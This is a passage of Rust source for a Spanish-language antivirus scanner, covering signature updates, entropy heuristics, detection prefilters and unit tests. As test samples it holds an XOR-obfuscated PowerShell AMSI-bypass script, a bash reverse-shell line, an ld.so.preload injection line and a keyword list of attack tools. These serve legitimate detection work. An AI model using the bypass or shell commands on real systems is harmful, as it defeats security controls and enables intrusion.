            let mut segments: Vec<&[u8]> = Vec::new();
            for item in pending.iter_mut() {
                let sample_len = std::cmp::min(item.content.len(), 64 * 1024);
                item.sample_seg_idx = Some(segments.len());
                segments.push(&item.content[..sample_len]);
                if item.is_pe_or_exec && item.content.len() >= 1024 {
                    item.poly_global_idx = Some(segments.len());
                    segments.push(&item.content);
                    item.poly_chunk_start = segments.len();
                    for c in item.content.chunks(1024) {
                        segments.push(c);
                    }
                    item.poly_chunk_count = segments.len() - item.poly_chunk_start;
                }
            }

            let hists_opt = gpu_hook::gpu_histograms(&segments);

            for item in pending {
                if item.is_pe_or_exec && !item.skip_entropy_fp {
                    let poly_profile = if let (Some(hists), Some(gi)) = (&hists_opt, item.poly_global_idx) {
                        polymorphic::polymorphic_profile_from_histograms(
                            &item.content,
                            &item.path_str,
                            &hists[gi],
                            &hists[item.poly_chunk_start..item.poly_chunk_start + item.poly_chunk_count],
                        )
                    } else {
                        analyze_polymorphic_entropy(&item.content, &item.path_str)
                    };

                    let sample_len = std::cmp::min(item.content.len(), 64 * 1024);
                    let entropy = if let (Some(hists), Some(si)) = (&hists_opt, item.sample_seg_idx) {
                        gpu_hook::entropy_from_histogram(&hists[si], sample_len)
                    } else {
                        gpu_hook::accelerated_entropy(&item.content[..sample_len])
                    };

                    results[item.idx] = Some(Ok(self.evaluate_evidence_and_classify(
                        Path::new(&item.path_str),
                        &item.content,
                        &item.sha256,
                        Some(entropy),
                        Some(poly_profile),
                        true,
                        item.start,
                    )));
                } else {
                    results[item.idx] = Some(Ok(self.evaluate_evidence_and_classify(
                        Path::new(&item.path_str),
                        &item.content,
                        &item.sha256,
                        None,
                        None,
                        true,
                        item.start,
                    )));
                }
            }
        }

        results.into_iter().map(|r| r.unwrap()).collect()
    }

    /// Escanea un bÃºfer en memoria utilizando firmas ClamAV, reglas YARA-X y anÃ¡lisis heurÃ­stico de entropÃ­a
    pub fn scan_bytes(&self, data: &[u8], name_hint: &str) -> ScanResult {
        let start = Instant::now();
        let mut hasher = Sha256::new();
        hasher.update(data);
        let sha256_hash = hex::encode(hasher.finalize());

        // 0. Verificación contra lista de excepciones de seguridad activas y no expiradas
        let hint_path = Path::new(name_hint);
        if self.exclusions.is_excluded(hint_path, Some(&sha256_hash)) {
            return ScanResult {
                file_path: name_hint.to_string(),
                sha256: sha256_hash,
                status: FileScanStatus::Clean,
                detection_name: Some("ExcluidoPorReglaDeSeguridad (HashPinned)".to_string()),
                engine: "SamuLibre/ExclusionManager".to_string(),
                scan_time_ms: start.elapsed().as_millis().max(1) as u64,
                ..Default::default()
            };
        }

        self.evaluate_evidence_and_classify(
            hint_path,
            data,
            &sha256_hash,
            None,
            None,
            false,
            start,
        )
    }

    /// Ejecuta el anÃ¡lisis real multi-motor sobre muestras de prueba estandarizadas (EICAR, AMSI, CLEAN)
    pub fn scan_sample_test(&self, sample_type: &str) -> ScanResult {
        match sample_type.to_uppercase().as_str() {
            "EICAR" => {
                const OBFUSCATED_EICAR: &[u8] = &[
                    2, 111, 21, 123, 10, 127, 26, 27, 10, 1, 110, 6, 10, 0, 2, 111, 110, 114, 10,
                    4, 115, 109, 25, 25, 115, 109, 39, 126, 31, 19, 25, 27, 8, 119, 9, 14, 27, 20,
                    30, 27, 8, 30, 119, 27, 20, 14, 19, 12, 19, 8, 15, 9, 119, 14, 31, 9, 14, 119,
                    28, 19, 22, 31, 123, 126, 18, 113, 18, 112,
                ];
                let eicar_bytes: Vec<u8> = OBFUSCATED_EICAR.iter().map(|b| b ^ 0x5A).collect();
                self.scan_bytes(&eicar_bytes, "eicar_test.com (Firma EstÃ¡ndar de Prueba)")
            }
            "AMSI" => {
                const OBFUSCATED_AMSI: &[u8] = &[
                    126, 59, 55, 41, 51, 15, 46, 51, 54, 41, 122, 103, 122, 1, 8, 63, 60, 7, 116,
                    27, 41, 41, 63, 55, 56, 54, 35, 116, 29, 63, 46, 14, 35, 42, 63, 114, 125, 9,
                    35, 41, 46, 63, 55, 116, 23, 59, 52, 59, 61, 63, 55, 63, 52, 46, 116, 27, 47,
                    46, 53, 55, 59, 46, 51, 53, 52, 116, 27, 55, 41, 51, 15, 46, 51, 54, 41, 125,
                    115, 97, 122, 126, 60, 51, 63, 54, 62, 122, 103, 122, 126, 59, 55, 41, 51, 15,
                    46, 51, 54, 41, 116, 29, 63, 46, 28, 51, 63, 54, 62, 114, 125, 59, 55, 41, 51,
                    19, 52, 51, 46, 28, 59, 51, 54, 63, 62, 125, 118, 125, 20, 53, 52, 10, 47, 56,
                    54, 51, 57, 118, 9, 46, 59, 46, 51, 57, 125, 115, 97, 122, 126, 60, 51, 63, 54,
                    62, 116, 9, 63, 46, 12, 59, 54, 47, 63, 114, 126, 52, 47, 54, 54, 118, 126, 46,
                    40, 47, 63, 115, 97,
                ];
                let amsi_bytes: Vec<u8> = OBFUSCATED_AMSI.iter().map(|b| b ^ 0x5A).collect();
                self.scan_bytes(&amsi_bytes, "bypass_amsi_dropper.ps1 (Script Malicioso)")
            }
            _ => {
                let clean_bytes = b"{\n  \"documento\": \"informe_corporativo.docx\",\n  \"estado\": \"Aprobado\",\n  \"hash_seguro\": true\n}";
                self.scan_bytes(clean_bytes, "informe_corporativo.docx (Documento Limpio)")
            }
        }
    }

    /// Importa firmas externas en formato de texto (ej. listas de hashes de MalwareBazaar)
    pub fn import_signatures(&mut self, hash: String, name: String) {
        self.known_signatures.insert(hash.to_lowercase(), name);
    }

    /// Actualiza y sincroniza las firmas conocidas desde fuentes y feeds comunitarios abiertos reales
    pub fn update_signatures(&mut self) -> Result<SignatureUpdateReport> {
        self.update_signatures_with_progress(|_| {})
    }

    /// Actualiza las firmas con emisión de eventos de progreso en tiempo real
    pub fn update_signatures_with_progress<F>(
        &mut self,
        progress_cb: F,
    ) -> Result<SignatureUpdateReport>
    where
        F: FnMut(UpdateStep),
    {
        let mut manager = UpdateManager::new("data");
        let report = manager.run_update(progress_cb);

        if !report.success {
            let err = report
                .error_message
                .unwrap_or_else(|| "Error desconocido durante la actualización".to_string());
            return Err(anyhow::anyhow!("{}", err));
        }

        // Recargar las firmas y reglas YARA recién instaladas en la memoria activa del scanner
        self.load_local_database();

        Ok(SignatureUpdateReport {
            total_signatures: self.known_signatures.len(),
            total_rules: self.pattern_rules.len(),
            new_added: report.new_signatures,
            timestamp: report.timestamp,
            feed_source: report.feed_source,
        })
    }

    /// Retorna la versión secuencial monótona instalada (protección anti-downgrade)
    pub fn get_installed_version_sequence(&self) -> u64 {
        let pkg_updater = PackageUpdater::new("data");
        pkg_updater.get_current_version_sequence()
    }

    /// Instala un paquete criptográfico verificado con soporte de rollback atómico
    pub fn install_update_package(
        &mut self,
        manifest: &samulibre_types::UpdatePackageManifest,
        files_data: &HashMap<String, Vec<u8>>,
        signing_key: &[u8],
    ) -> Result<()> {
        let pkg_updater = PackageUpdater::new("data");
        pkg_updater.install_package(manifest, files_data, signing_key)?;
        self.load_local_database();
        Ok(())
    }

    pub fn get_update_history(&self) -> Vec<UpdateHistoryEntry> {
        let history_file = Path::new("data")
            .join("signatures")
            .join("update_history.json");
        if let Ok(data) = fs::read_to_string(&history_file) {
            serde_json::from_str(&data).unwrap_or_default()
        } else {
            vec![UpdateHistoryEntry {
                id: "SIG-INIT".to_string(),
                timestamp: chrono::Local::now().format("%Y-%m-%d %H:%M:%S").to_string(),
                signatures_added: self.known_signatures.len(),
                total_signatures: self.known_signatures.len(),
                feed_source: "MalwareBazaar & ThreatFox Feeds".to_string(),
                version_tag: "v2026.10.11-Base".to_string(),
                improvements: vec![
                    "InicializaciÃ³n de motor multi-motor SamuLibre.".to_string(),
                    "Reglas de mitigaciÃ³n de scripts maliciosos y heurÃ­stica de entropÃ­a."
                        .to_string(),
                ],
            }]
        }
    }

    pub fn signature_count(&self) -> usize {
        self.known_signatures.len()
    }

    pub fn rule_count(&self) -> usize {
        self.pattern_rules.len()
    }

    /// Retorna el catálogo vivo y desglose exacto de firmas SHA-256, reglas YARA e IPs C2
    pub fn get_signatures_catalog(&self) -> SignatureCatalogResponse {
        let sig_dir = Path::new("data").join("signatures");
        build_signatures_catalog(&sig_dir, &self.known_signatures, &self.pattern_rules)
    }
}

#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct UpdateHistoryEntry {
    pub id: String,
    pub timestamp: String,
    pub signatures_added: usize,
    pub total_signatures: usize,
    pub feed_source: String,
    pub version_tag: String,
    pub improvements: Vec<String>,
}

#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct SignatureUpdateReport {
    pub total_signatures: usize,
    pub total_rules: usize,
    pub new_added: usize,
    pub timestamp: String,
    pub feed_source: String,
}

/// CÃ¡lculo de entropÃ­a de Shannon (0.0 a 8.0) para detectar compresiÃ³n/cifrado
#[allow(dead_code)]
fn calculate_entropy(data: &[u8]) -> f64 {
    if data.is_empty() {
        return 0.0;
    }
    let mut counts = [0usize; 256];
    for &b in data {
        counts[b as usize] += 1;
    }
    let len = data.len() as f64;
    let mut entropy = 0.0;
    for &count in &counts {
        if count > 0 {
            let p = count as f64 / len;
            entropy -= p * p.log2();
        }
    }
    entropy
}

fn is_archive_or_media_file(path: &Path) -> bool {
    let ext = match path.extension().and_then(|s| s.to_str()) {
        Some(e) => e.to_lowercase(),
        None => return false,
    };
    matches!(
        ext.as_str(),
        "zip"
            | "rar"
            | "7z"
            | "tar"
            | "gz"
            | "bz2"
            | "xz"
            | "iso"
            | "img"
            | "xci"
            | "nsp"
            | "vmdk"
            | "ova"
            | "ovf"
            | "vdi"
            | "vhdx"
            | "vhd"
            | "qcow2"
            | "gns3project"
            | "mp4"
            | "mkv"
            | "avi"
            | "mov"
            | "wmv"
            | "flv"
            | "mp3"
            | "flac"
            | "wav"
            | "aac"
            | "jpg"
            | "jpeg"
            | "png"
            | "webp"
            | "gif"
    )
}

pub fn is_document_file(path: &Path) -> bool {
    let ext = match path.extension().and_then(|s| s.to_str()) {
        Some(e) => e.to_lowercase(),
        None => return false,
    };
    matches!(
        ext.as_str(),
        "pdf" | "docx" | "xlsx" | "pptx" | "odt" | "ods" | "odp" | "epub"
    )
}

pub fn is_suspicious_pdf(data: &[u8]) -> bool {
    // Solo alertar ante triggers de ejecución (/Launch) o JavaScript con primitivas reales de explotación/ejecución,
    // evitando falsos positivos en formularios Adobe Acrobat (app.alert / app.launchURL), certificados digitales y documentación.
    if contains_case_insensitive(data, b"/Launch") {
        return true;
    }
    let has_js = contains_case_insensitive(data, b"/JavaScript")
        || contains_case_insensitive(data, b"/JS ")
        || contains_case_insensitive(data, b"/JS(");
    if !has_js {
        return false;
    }
    contains_case_insensitive(data, b"exportDataObject")
        || contains_case_insensitive(data, b"eval(")
        || contains_case_insensitive(data, b"unescape(")
        || contains_case_insensitive(data, b"cmd.exe")
        || contains_case_insensitive(data, b"powershell")
        || contains_case_insensitive(data, b"WScript.Shell")
        || contains_case_insensitive(data, b"%u00")
}

/// Extrae la procedencia (ADS Zone.Identifier en Windows) y genera una explicaciÃ³n simple en lenguaje humano estilo XDR
pub fn extract_file_origin_and_story(
    path: &Path,
    threat_name: &str,
) -> (
    Option<String>,
    Option<String>,
    Option<String>,
    Option<String>,
) {
    #[cfg(target_os = "windows")]
    let (origin_source, origin_url) = {
        let ads_path = format!("{}:Zone.Identifier", path.display());
        if let Ok(content) = fs::read_to_string(&ads_path) {
            let mut host_url = None;
            for line in content.lines() {
                let trimmed = line.trim();
                if trimmed.starts_with("HostUrl=") {
                    host_url = Some(trimmed.trim_start_matches("HostUrl=").to_string());
                    break;
                }
            }
            if let Some(url) = host_url {
                let friendly = if url.contains("web.whatsapp.com") {
                    "WhatsApp Web (MensajerÃ­a)".to_string()
                } else if url.contains("mail.google.com") {
                    "Gmail (Correo electrÃ³nico)".to_string()
                } else if url.contains("outlook.live.com") || url.contains("outlook.office.com") {
                    "Microsoft Outlook (Correo)".to_string()
                } else if url.contains("drive.google.com") {
                    "Google Drive".to_string()
                } else if url.contains("t.me") || url.contains("web.telegram.org") {
                    "Telegram Web".to_string()
                } else if url.contains("teams.microsoft.com") {
                    "Microsoft Teams".to_string()
                } else if url.contains("github.com") {
                    "GitHub".to_string()
                } else if let Some(domain) =
                    url.split("://").nth(1).and_then(|s| s.split('/').next())
                {
                    format!("Descarga Web ({})", domain)
                } else {
                    "Descarga de Internet".to_string()
                };
                (Some(friendly), Some(url))
            } else {
                (Some("Descarga de Internet".to_string()), None)
            }
        } else {
            (
                Some("Archivo local o creado en este equipo".to_string()),
                None,
            )
        }
    };

    #[cfg(not(target_os = "windows"))]
    let (origin_source, origin_url) = (Some("Archivo local del sistema".to_string()), None);

    let threat_lower = threat_name.to_lowercase();
    let (explanation, action) = if threat_lower.contains("entropy") {
        (
            Some("La Inteligencia Artificial detectÃ³ que el archivo contiene imÃ¡genes escaneadas o datos muy comprimidos. Si es un documento legÃ­timo, no contiene virus ni peligro alguno.".to_string()),
            Some("Excluir (Falso Positivo)".to_string())
        )
    } else if threat_lower.contains("powershell") || threat_lower.contains("dropper") {
        (
            Some("Se detectÃ³ un script diseÃ±ado para ejecutar comandos ocultos en Windows y descargar programas no autorizados.".to_string()),
            Some("Cuarentena Inmediata".to_string())
        )
    } else if threat_lower.contains("ransomware") || threat_lower.contains("shadow") {
        (
            Some("Este archivo intentÃ³ borrar las copias de seguridad de Windows, una tÃ©cnica tÃ­pica de virus de secuestro de archivos (Ransomware).".to_string()),
            Some("Eliminar Permanentemente".to_string())
        )
    } else if threat_lower.contains("mimikatz") || threat_lower.contains("lsass") {
        (
            Some("Herramienta diseÃ±ada para extraer contraseÃ±as guardadas en la memoria de Windows.".to_string()),
            Some("Cuarentena Inmediata".to_string())
        )
    } else if threat_lower.contains("eicar") {
        (
            Some("Archivo de prueba estandarizado internacional para comprobar que el antivirus funciona correctamente.".to_string()),
            Some("Ignorar o Eliminar".to_string())
        )
    } else {
        (
            Some("El archivo contiene firmas o patrones sospechosos identificados por los motores de seguridad.".to_string()),
            Some("Mover a Cuarentena".to_string())
        )
    };

    (origin_source, origin_url, explanation, action)
}

/// Evalúa reglas de patrones YARA/Heurísticos excluyendo artefactos de compilación/UI estáticos.
#[allow(dead_code)]
fn match_pattern_rules(path_ref: &Path, content: &[u8], rules: &[PatternRule]) -> Option<String> {
    let ext = path_ref
        .extension()
        .and_then(|s| s.to_str())
        .map(|s| s.to_ascii_lowercase())
        .unwrap_or_default();

    // Ignorar artefactos de compilación, símbolos, bases de datos locales, dumps, recursos y archivos web/datos
    if matches!(
        ext.as_str(),
        "wixobj" | "wixpdb" | "pdb" | "obj" | "lib" | "rlib" | "rmeta" | "d" | "map" | "css" | "svg"
            | "pm" | "cdxml" | "idx" | "fpt" | "vscdb" | "typelib" | "dmp" | "lstm_model" | "backup"
            | "ldb" | "part" | "png" | "jpg" | "jpeg" | "gif" | "webp" | "woff" | "woff2"
    ) {
        return None;
    }

    let p_lower = path_ref.to_string_lossy().to_ascii_lowercase();
    if p_lower.contains("samu_update_live_test_") {
        return None;
    }

    if !has_suspicious_indicators(content) {
        return None;
    }

    let has_exec_magic = content.starts_with(b"MZ") || content.starts_with(b"\x7FELF");
    let is_exec_or_script = (ext.is_empty() && has_exec_magic)
        || matches!(
            ext.as_str(),
            "exe" | "dll" | "sys" | "scr" | "pif" | "cpl" | "com" | "msi" | "ps1" | "bat" | "cmd" | "vbs" | "hta" | "js" | "elf" | "sh" | "py"
        );
    let is_win_exec_or_script = content.starts_with(b"MZ")
        || matches!(
            ext.as_str(),
            "exe" | "dll" | "sys" | "scr" | "pif" | "cpl" | "com" | "msi" | "ps1" | "bat" | "cmd" | "vbs" | "hta" | "js"
        );
    let is_linux_exec_or_sh = content.starts_with(b"\x7FELF")
        || matches!(ext.as_str(), "so" | "sh" | "elf");

    for rule in rules {
        if rule.name == "PUA.Win32.CoinMiner.Gen" && !is_win_exec_or_script {
            continue;
        }
        if rule.name == "Trojan.Spy.ChromiumCredentialHarvester" && !is_exec_or_script {
            continue;
        }
        if rule.name == "Rootkit.Linux.LdPreloadHook"
            && (!is_linux_exec_or_sh
                || p_lower.contains("\\android\\sdk\\")
                || p_lower.contains("\\python"))
        {
            continue;
        }
        if rule.name.starts_with("YARA.") && !rule.name.eq_ignore_ascii_case("YARA.eicar") {
            // Reglas YARA comunitarias descargadas: solo evaluar sobre ejecutables reales (no .js/.bat/SDKs/Microsoft)
            if !has_exec_magic
                || matches!(ext.as_str(), "js" | "bat" | "cmd" | "bin" | "json")
                || p_lower.contains("\\android\\sdk\\")
                || p_lower.contains("\\windows\\")
                || p_lower.contains("\\program files")
                || p_lower.contains("\\azurefunctionstools\\")
            {
                continue;
            }
        }
        if rule.pattern.is_match(content) {
            return Some(rule.name.clone());
        }
    }
    None
}

/// Recopila TODAS las reglas de patrones YARA/Heurísticas que coinciden para evaluación multicapa
fn collect_pattern_rules<'a>(
    path_ref: &Path,
    content: &[u8],
    rules: &'a [PatternRule],
) -> Vec<&'a PatternRule> {
    let mut matched = Vec::new();
    let ext = path_ref
        .extension()
        .and_then(|s| s.to_str())
        .map(|s| s.to_ascii_lowercase())
        .unwrap_or_default();

    if matches!(
        ext.as_str(),
        "wixobj" | "wixpdb" | "pdb" | "obj" | "lib" | "rlib" | "rmeta" | "d" | "map" | "css" | "svg"
            | "pm" | "cdxml" | "idx" | "fpt" | "vscdb" | "typelib" | "dmp" | "lstm_model" | "backup"
            | "ldb" | "part" | "png" | "jpg" | "jpeg" | "gif" | "webp" | "woff" | "woff2"
    ) {
        return matched;
    }

    let p_lower = path_ref.to_string_lossy().to_ascii_lowercase();
    if p_lower.contains("samu_update_live_test_") || !has_suspicious_indicators(content) {
        return matched;
    }

    let has_exec_magic = content.starts_with(b"MZ") || content.starts_with(b"\x7FELF");
    let is_exec_or_script = (ext.is_empty() && has_exec_magic)
        || matches!(
            ext.as_str(),
            "exe" | "dll" | "sys" | "scr" | "pif" | "cpl" | "com" | "msi" | "ps1" | "bat" | "cmd" | "vbs" | "hta" | "js" | "elf" | "sh" | "py"
        );
    let is_win_exec_or_script = content.starts_with(b"MZ")
        || matches!(
            ext.as_str(),
            "exe" | "dll" | "sys" | "scr" | "pif" | "cpl" | "com" | "msi" | "ps1" | "bat" | "cmd" | "vbs" | "hta" | "js"
        );
    let is_linux_exec_or_sh = content.starts_with(b"\x7FELF")
        || matches!(ext.as_str(), "so" | "sh" | "elf");

    for rule in rules {
        if rule.name == "PUA.Win32.CoinMiner.Gen" && !is_win_exec_or_script {
            continue;
        }
        if rule.name == "Trojan.Spy.ChromiumCredentialHarvester" && !is_exec_or_script {
            continue;
        }
        if rule.name == "Rootkit.Linux.LdPreloadHook"
            && (!is_linux_exec_or_sh
                || p_lower.contains("\\android\\sdk\\")
                || p_lower.contains("\\python"))
        {
            continue;
        }
        if rule.name.starts_with("YARA.") && !rule.name.eq_ignore_ascii_case("YARA.eicar") {
            if !has_exec_magic
                || matches!(ext.as_str(), "js" | "bat" | "cmd" | "bin" | "json")
                || p_lower.contains("\\android\\sdk\\")
                || p_lower.contains("\\windows\\")
                || p_lower.contains("\\program files")
                || p_lower.contains("\\azurefunctionstools\\")
            {
                continue;
            }
        }
        if rule.pattern.is_match(content) {
            matched.push(rule);
        }
    }
    matched
}

/// Evita falsos positivos de entropía en binarios firmados, .NET, instaladores NSIS/InnoSetup y kernels EFI WSL.
fn should_skip_entropy_fp(
    path_ref: &Path,
    content: &[u8],
    pe_report: Option<&pe_analyzer::PeAnalysisReport>,
) -> bool {
    let ext = path_ref
        .extension()
        .and_then(|s| s.to_str())
        .map(|s| s.to_ascii_lowercase())
        .unwrap_or_default();
    let p_lower = path_ref.to_string_lossy().to_ascii_lowercase();
    if matches!(ext.as_str(), "mun" | "mui" | "hxs")
        || (ext == "rs" && p_lower.starts_with("c:\\windows\\"))
    {
        return true;
    }
    if let Some(r) = pe_report {
        if r.is_suspicious {
            return false;
        }
        if r.has_authenticode_signature || r.is_dotnet {
            return true;
        }
        if p_lower.starts_with("c:\\xampp\\") {
            return true;
        }
        // Instaladores legítimos NSIS / Inno Setup comprimen su payload (entropía ~7.8-7.95)
        let header_slice = &content[..content.len().min(512 * 1024)];
        if header_slice.windows(12).any(|w| w == b"NullsoftInst")
            || header_slice.windows(10).any(|w| w == b"Inno Setup")
        {
            return true;
        }
    }
    if content.starts_with(b"MZ") {
        // Kernels Linux EFI (bzImage/WSL) comienzan con "MZ" para arranque UEFI
        let p_lower = path_ref.to_string_lossy().to_ascii_lowercase();
        if p_lower.contains("\\wsl\\tools\\kernel")
            || p_lower.ends_with("\\vmlinuz")
            || p_lower.ends_with("\\bzimage")
        {
            return true;
        }
    }
    false
}

/// Pre-filtro ultra-rápido de subcadenas en UNA SOLA PASADA (<0.05 ms).
fn has_suspicious_indicators(data: &[u8]) -> bool {
    let len = data.len();
    if len < 10 {
        return false;
    }

    const NEEDLES: &[&[u8]] = &[
        b"eicar",
        b"x5o!p",
        b"powershell",
        b"pwsh",
        b"amsi",
        b"cryptunprotectdata",
        b"os_crypt",
        b"encrypted_key",
        b"vssadmin",
        b"shadowcopy",
        b"bcdedit",
        b"certutil",
        b"bitsadmin",
        b"mshta",
        b"regsvr32",
        b"sekurlsa",
        b"mimikatz",
        b"/dev/tcp/",
        b"ld.so.preload",
        b"ld_preload",
        b"/etc/cron",
        b"stratum",
        b"xmrig",
        b"samulibre_test_token",
    ];

    // Tabla de 1er byte (minúscula) para evitar comparar 24 veces por cada byte del archivo
    const FIRST_BYTES: [u8; 256] = {
        let mut t = [0u8; 256];
        t[b'e' as usize] = 1; t[b'E' as usize] = 1;
        t[b'x' as usize] = 2; t[b'X' as usize] = 2;
        t[b'p' as usize] = 3; t[b'P' as usize] = 3;
        t[b'a' as usize] = 4; t[b'A' as usize] = 4;
        t[b'c' as usize] = 5; t[b'C' as usize] = 5;
        t[b'o' as usize] = 6; t[b'O' as usize] = 6;
        t[b'v' as usize] = 7; t[b'V' as usize] = 7;
        t[b's' as usize] = 8; t[b'S' as usize] = 8;
        t[b'b' as usize] = 9; t[b'B' as usize] = 9;
        t[b'm' as usize] = 10; t[b'M' as usize] = 10;
        t[b'r' as usize] = 11; t[b'R' as usize] = 11;
        t[b'/' as usize] = 12;
        t[b'l' as usize] = 13; t[b'L' as usize] = 13;
        t
    };

    let mut i = 0;
    let limit = len - 4;
    while i <= limit {
        let cat = FIRST_BYTES[data[i] as usize];
        if cat != 0 {
            let rem = &data[i..];
            let hit = match cat {
                1 => (rem.len() >= 5 && rem[..5].eq_ignore_ascii_case(NEEDLES[0]))
                    || (rem.len() >= 13 && rem[..13].eq_ignore_ascii_case(NEEDLES[7])),
                2 => (rem.len() >= 5 && rem[..5].eq_ignore_ascii_case(NEEDLES[1]))
                    || (rem.len() >= 5 && rem[..5].eq_ignore_ascii_case(NEEDLES[22])),
                3 => (rem.len() >= 10 && rem[..10].eq_ignore_ascii_case(NEEDLES[2]))
                    || (rem.len() >= 4 && rem[..4].eq_ignore_ascii_case(NEEDLES[3])),
                4 => rem.len() >= 4 && rem[..4].eq_ignore_ascii_case(NEEDLES[4]),
                5 => (rem.len() >= 18 && rem[..18].eq_ignore_ascii_case(NEEDLES[5]))
                    || (rem.len() >= 8 && rem[..8].eq_ignore_ascii_case(NEEDLES[11])),
                6 => rem.len() >= 8 && rem[..8].eq_ignore_ascii_case(NEEDLES[6]),
                7 => rem.len() >= 8 && rem[..8].eq_ignore_ascii_case(NEEDLES[8]),
                8 => (rem.len() >= 10 && rem[..10].eq_ignore_ascii_case(NEEDLES[9]))
                    || (rem.len() >= 8 && rem[..8].eq_ignore_ascii_case(NEEDLES[15]))
                    || (rem.len() >= 7 && rem[..7].eq_ignore_ascii_case(NEEDLES[21]))
                    || (rem.len() >= 20 && rem[..20].eq_ignore_ascii_case(NEEDLES[23])),
                9 => (rem.len() >= 7 && rem[..7].eq_ignore_ascii_case(NEEDLES[10]))
                    || (rem.len() >= 9 && rem[..9].eq_ignore_ascii_case(NEEDLES[12])),
                10 => (rem.len() >= 5 && rem[..5].eq_ignore_ascii_case(NEEDLES[13]))
                    || (rem.len() >= 8 && rem[..8].eq_ignore_ascii_case(NEEDLES[16])),
                11 => rem.len() >= 8 && rem[..8].eq_ignore_ascii_case(NEEDLES[14]),
                12 => (rem.len() >= 9 && rem[..9].eq_ignore_ascii_case(NEEDLES[17]))
                    || (rem.len() >= 9 && rem[..9].eq_ignore_ascii_case(NEEDLES[20])),
                13 => (rem.len() >= 13 && rem[..13].eq_ignore_ascii_case(NEEDLES[18]))
                    || (rem.len() >= 10 && rem[..10].eq_ignore_ascii_case(NEEDLES[19])),
                _ => false,
            };
            if hit {
                return true;
            }
        }
        i += 1;
    }
    false
}

fn contains_case_insensitive(haystack: &[u8], needle: &[u8]) -> bool {
    let needle_len = needle.len();
    if needle_len > haystack.len() || needle_len == 0 {
        return false;
    }
    let first_lower = needle[0].to_ascii_lowercase();
    let first_upper = needle[0].to_ascii_uppercase();

    let mut i = 0;
    let max_idx = haystack.len() - needle_len;
    while i <= max_idx {
        let b = haystack[i];
        if b == first_lower || b == first_upper {
            if haystack[i..i + needle_len].eq_ignore_ascii_case(needle) {
                return true;
            }
        }
        i += 1;
    }
    false
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Write;

    #[test]
    fn test_clean_file_detection() {
        let scanner = MultiEngineScanner::new();
        let temp_dir = std::env::temp_dir();
        let test_file = temp_dir.join("samu_test_clean.txt");
        let mut f = File::create(&test_file).unwrap();
        f.write_all(b"Hello world clean document for testing.")
            .unwrap();

        let res = scanner.scan_file(&test_file).unwrap();
        assert_eq!(res.status, FileScanStatus::Clean);
        let _ = fs::remove_file(test_file);
    }

    #[test]
    fn test_amsi_bypass_detection() {
        let scanner = MultiEngineScanner::new();
        const OBFUSCATED_AMSI: &[u8] = &[
            126, 59, 55, 41, 51, 15, 46, 51, 54, 41, 122, 103, 122, 1, 8, 63, 60, 7, 116, 27, 41,
            41, 63, 55, 56, 54, 35, 116, 29, 63, 46, 14, 35, 42, 63, 114, 125, 9, 35, 41, 46, 63,
            55, 116, 23, 59, 52, 59, 61, 63, 55, 63, 52, 46, 116, 27, 47, 46, 53, 55, 59, 46, 51,
            53, 52, 116, 27, 55, 41, 51, 15, 46, 51, 54, 41, 125, 115, 97, 122, 126, 60, 51, 63,
            54, 62, 122, 103, 122, 126, 59, 55, 41, 51, 15, 46, 51, 54, 41, 116, 29, 63, 46, 28,
            51, 63, 54, 62, 114, 125, 59, 55, 41, 51, 19, 52, 51, 46, 28, 59, 51, 54, 63, 62, 125,
            118, 125, 20, 53, 52, 10, 47, 56, 54, 51, 57, 118, 9, 46, 59, 46, 51, 57, 125, 115, 97,
            122, 126, 60, 51, 63, 54, 62, 116, 9, 63, 46, 12, 59, 54, 47, 63, 114, 126, 52, 47, 54,
            54, 118, 126, 46, 40, 47, 63, 115, 97,
        ];
        let amsi_bytes: Vec<u8> = OBFUSCATED_AMSI.iter().map(|b| b ^ 0x5A).collect();
        let res = scanner.scan_bytes(&amsi_bytes, "test_memory_amsi.ps1");
        assert_eq!(res.status, FileScanStatus::Infected);
    }

    #[test]
    fn test_bounded_large_file_streaming() {
        let scanner = MultiEngineScanner::new();
        let temp_dir = std::env::temp_dir();
        let test_file = temp_dir.join("samu_test_large.bin");
        let mut f = File::create(&test_file).unwrap();
        let dummy = vec![0u8; 1024 * 1024];
        for _ in 0..35 {
            f.write_all(&dummy).unwrap();
        }

        let start = Instant::now();
        let res = scanner.scan_file(&test_file).unwrap();
        let elapsed = start.elapsed();
        let budget_ms = if cfg!(debug_assertions) { 2500 } else { 500 };
        assert!(
            elapsed.as_millis() < budget_ms,
            "Large file triage exceeded budget: {:?}",
            elapsed
        );
        assert_eq!(res.status, FileScanStatus::Clean);
        let _ = fs::remove_file(test_file);
    }

    #[test]
    fn test_real_sample_scanning() {
        let scanner = MultiEngineScanner::new();

        let eicar = scanner.scan_sample_test("EICAR");
        assert_eq!(eicar.status, FileScanStatus::Infected);
        assert_eq!(
            eicar.sha256,
            "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f"
        );

        let amsi = scanner.scan_sample_test("AMSI");
        assert_eq!(amsi.status, FileScanStatus::Infected);
        assert!(amsi.detection_name.unwrap().contains("Amsi"));

        let clean = scanner.scan_sample_test("CLEAN");
        assert_eq!(clean.status, FileScanStatus::Clean);
        assert_eq!(clean.engine, "Multi-Engine Clean");
    }

    #[test]
    fn test_fast_path_substring_indicators() {
        assert!(!has_suspicious_indicators(
            b"Clean corporate document text without any malware."
        ));
        assert!(!has_suspicious_indicators(
            b"Just an everyday image or data chunk."
        ));
        assert!(has_suspicious_indicators(b"powershell.exe -enc aGVsbG8="));
        assert!(has_suspicious_indicators(
            b"AmsiUtils amsiInitFailed bypass"
        ));
        const OBF_E: &[u8] = &[
            2, 111, 21, 123, 10, 127, 26, 27, 10, 1, 110, 6, 10, 0, 2, 111, 110, 114, 10, 4, 115,
            109, 25, 25, 115, 109, 39, 126, 31, 19, 25, 27, 8, 119, 9, 14, 27, 20, 30, 27, 8, 30,
            119, 27, 20, 14, 19, 12, 19, 8, 15, 9, 119, 14, 31, 9, 14, 119, 28, 19, 22, 31, 123,
            126, 18, 113, 18, 112,
        ];
        let e_dec: Vec<u8> = OBF_E.iter().map(|b| b ^ 0x5A).collect();
        assert!(has_suspicious_indicators(&e_dec));
        assert!(has_suspicious_indicators(b"CryptUnprotectData Login Data"));
        assert!(has_suspicious_indicators(
            b"/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
        ));
        assert!(has_suspicious_indicators(
            b"echo '/lib/evil.so' >> /etc/ld.so.preload"
        ));
    }

    #[test]
